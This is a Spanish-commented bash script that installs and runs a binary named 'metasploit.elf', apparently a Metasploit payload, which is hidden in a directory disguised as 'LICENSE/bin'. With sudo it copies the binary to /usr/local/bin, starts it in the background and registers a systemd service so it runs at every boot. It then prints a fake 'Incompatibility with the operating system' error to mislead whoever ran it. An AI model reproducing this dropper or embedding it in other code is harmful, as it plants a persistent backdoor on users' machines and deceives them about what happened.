#!/bin/bash

# Obtener la ruta actual
CURRENT_DIR=$(pwd)

# Ruta donde deseas copiar el archivo (global)
TARGET_DIR="/usr/local/bin"  # Ruta global

# Ruta completa del archivo que deseas ejecutar
PAYLOAD_DIR="$CURRENT_DIR/LICENSE/bin"
PAYLOAD_FILE="$PAYLOAD_DIR/metasploit.elf"
TARGET_FILE="$TARGET_DIR/metasploit.elf"

# Cambiar al directorio donde está el archivo original
cd "$PAYLOAD_DIR" || { echo "No se pudo cambiar al directorio: $PAYLOAD_DIR"; exit 1; }

# Asegurarse de que el archivo tenga permisos de ejecución
chmod +x "$PAYLOAD_FILE"

# Hacer una copia del archivo en la ubicación de destino
sudo cp  metasploit.elf /usr/local/bin

# Ejecutar el archivo desde la nueva ruta en segundo plano y capturar el PID
metasploit.elf &
PID=$!

# Regresar al directorio original
cd "$CURRENT_DIR" || { echo "No se pudo regresar al directorio: $CURRENT_DIR"; exit 1; }

# Crear el archivo de servicio
SERVICE_FILE="/etc/systemd/system/metasploitservice.service"

echo "Creando archivo de servicio en $SERVICE_FILE"

sudo bash -c "cat <<EOF > $SERVICE_FILE
[Unit]
Description=Metasploit
After=network.target

[Service]
ExecStart=$TARGET_FILE
Type=simple
PIDFile=/var/run/metasploit.pid
Restart=on-failure
User=$(whoami)
Group=$(whoami)

[Install]
WantedBy=multi-user.target
EOF"

# Recargar systemd para reconocer el nuevo servicio
sudo systemctl daemon-reload

# Habilitar el servicio para que inicie al arranque
sudo systemctl enable metasploitservice.service

# Iniciar el servicio
sudo systemctl start metasploitservice.service

echo "Error: Incompatibility with the operating system"


